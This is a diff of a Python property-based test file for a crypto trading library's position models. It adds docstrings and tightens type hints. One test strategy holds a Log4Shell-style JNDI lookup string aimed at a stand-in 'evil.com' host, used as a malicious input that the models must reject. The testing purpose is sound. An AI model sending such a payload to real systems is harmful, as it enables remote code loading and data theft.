@@ -17,7 +17,7 @@ from decimal import Decimal
 from typing import Any
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
@@ -44,11 +44,15 @@ from cyberdelta.exceptions.parsing import (
 
 
 def position_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for position financial fields."""
+    """Generate decimal strings for position financial fields.
+
+    Returns:
+        SearchStrategy that generates decimal strings for financial position values.
+    """
     return st.one_of([
         # Trading position amounts
-        st.decimals(min_value=Decimal("-1000000"), max_value=Decimal("1000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("-100000"), max_value=Decimal("100000"), places=6).map(str),
+        st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
+        st.decimals(min_value=Decimal(-100000), max_value=Decimal(100000), places=6).map(str),
         # Common position values
         st.just("0"),
         st.just("0.0"),
@@ -65,7 +69,11 @@ def position_decimal_strategy() -> SearchStrategy[str]:
 
 
 def trading_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid trading symbol strings."""
+    """Generate valid trading symbol strings.
+
+    Returns:
+        SearchStrategy that generates various valid trading symbol formats for testing.
+    """
     return st.one_of([
         # Common trading pairs
         st.sampled_from(["BTC_USDC", "ETH_USDC", "SOL_USDC", "AVAX_USDC", "ARB_USDC"]),
@@ -85,7 +93,11 @@ def trading_symbol_strategy() -> SearchStrategy[str]:
 
 
 def position_id_strategy() -> SearchStrategy[str]:
-    """Generate valid position ID strings."""
+    """Generate valid position ID strings.
+
+    Returns:
+        SearchStrategy that generates various position ID formats for testing.
+    """
     return st.one_of([
         # Common formats
         st.text(
@@ -109,7 +121,11 @@ def position_id_strategy() -> SearchStrategy[str]:
 
 
 def user_id_strategy() -> SearchStrategy[int]:
-    """Generate valid user ID integers."""
+    """Generate valid user ID integers.
+
+    Returns:
+        SearchStrategy that generates valid user ID values within proper ranges.
+    """
     return st.one_of([
         st.integers(min_value=0, max_value=2**31 - 1),  # Standard range
         st.just(0),  # Edge case
@@ -118,8 +134,12 @@ def user_id_strategy() -> SearchStrategy[int]:
     ])
 
 
-def timestamp_strategy() -> SearchStrategy[Any]:
-    """Generate valid timestamp values."""
+def timestamp_strategy() -> SearchStrategy[int | float | str | None]:
+    """Generate valid timestamp values.
+
+    Returns:
+        SearchStrategy that generates various timestamp formats and values for testing.
+    """
     return st.one_of([
         # Unix timestamps (milliseconds)
         st.integers(min_value=1000000000000, max_value=2000000000000),
@@ -140,8 +160,12 @@ def timestamp_strategy() -> SearchStrategy[Any]:
 
 
 @st.composite
-def margin_function_data(draw) -> dict[str, str]:
-    """Generate valid margin function data."""
+def margin_function_data(draw: st.DrawFn) -> dict[str, str]:
+    """Generate valid margin function data.
+
+    Returns:
+        Dictionary containing margin function parameters with base and factor values.
+    """
     return {
         "base": draw(position_decimal_strategy()),
         "factor": draw(position_decimal_strategy()),
@@ -149,8 +173,12 @@ def margin_function_data(draw) -> dict[str, str]:
 
 
 @st.composite
-def valid_position_response_data(draw) -> dict[str, Any]:
-    """Generate valid position response data structure."""
+def valid_position_response_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid position response data structure.
+
+    Returns:
+        Dictionary containing complete position response data with margin functions and metadata.
+    """
     imf_data = draw(margin_function_data())
     mmf_data = draw(margin_function_data())
 
@@ -179,8 +207,12 @@ def valid_position_response_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_position_update_data(draw) -> dict[str, Any]:
-    """Generate valid position update data structure."""
+def valid_position_update_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid position update data structure.
+
+    Returns:
+        Dictionary containing position update data with abbreviated field names.
+    """
     return {
         "e": "positionUpdate",
         "E": draw(timestamp_strategy()),
@@ -197,8 +229,12 @@ def valid_position_update_data(draw) -> dict[str, Any]:
     }
 
 
-def malicious_position_strategy() -> SearchStrategy[Any]:
-    """Generate malicious strings for position security testing."""
+def malicious_position_strategy() -> SearchStrategy[object]:
+    """Generate malicious strings for position security testing.
+
+    Returns:
+        SearchStrategy that generates potentially malicious inputs to test security validation.
+    """
     return st.one_of([
         # Financial manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-positions}"),
@@ -229,8 +265,12 @@ def malicious_position_strategy() -> SearchStrategy[Any]:
     ])
 
 
-def invalid_position_type_strategy() -> SearchStrategy[Any]:
-    """Generate invalid types for position field validation testing."""
+def invalid_position_type_strategy() -> SearchStrategy[object]:
+    """Generate invalid types for position field validation testing.
+
+    Returns:
+        SearchStrategy that generates invalid data types to test field validation.
+    """
     return st.one_of([
         st.none(),
         st.integers(),
@@ -255,7 +295,7 @@ class TestBackpackRawPositionResponseProperties:
 
     @given(position_data=valid_position_response_data())
     def test_position_validation_success_properties(self, position_data: dict[str, Any]) -> None:
-        """Property: Valid position data should always create valid BackpackRawPositionResponse objects."""
+        """Property: Valid position data should always create valid objects."""
         # Skip invalid nested margin function data
         try:
             for field in [
@@ -334,10 +374,10 @@ class TestBackpackRawPositionResponseProperties:
         malicious_value=malicious_position_strategy(),
     )
     def test_position_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Position model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, str | dict[str, str] | int | object] = {
             "breakEvenPrice": "20000.50",
             "entryPrice": "19800.00",
             "estLiquidationPrice": "15000.00",
@@ -381,9 +421,9 @@ class TestBackpackRawPositionResponseProperties:
         ]),
         invalid_value=invalid_position_type_strategy(),
     )
-    def test_position_type_safety_properties(self, field_name: str, invalid_value: Any) -> None:
+    def test_position_type_safety_properties(self, field_name: str, invalid_value: object) -> None:
         """Property: Position model should enforce strict type safety."""
-        base_data = {
+        base_data: dict[str, str | dict[str, str] | int | object] = {
             "breakEvenPrice": "20000.50",
             "entryPrice": "19800.00",
             "estLiquidationPrice": "15000.00",
@@ -604,10 +644,10 @@ class TestBackpackRawPositionUpdateProperties:
         malicious_value=malicious_position_strategy(),
     )
     def test_position_update_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Position update model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, str | int | object] = {
             "e": "positionUpdate",
             "E": 1678886400000,
             "s": "SOL_USDC",
@@ -643,7 +683,7 @@ class TestBackpackRawPositionUpdateProperties:
             st.text().filter(lambda x: not x.isdigit() and "T" not in x),
         ])
     )
-    def test_position_update_timestamp_validation_properties(self, timestamp_value: Any) -> None:
+    def test_position_update_timestamp_validation_properties(self, timestamp_value: object) -> None:
         """Property: Position update timestamps should be validated properly."""
         update_data = {
             "e": "positionUpdate",
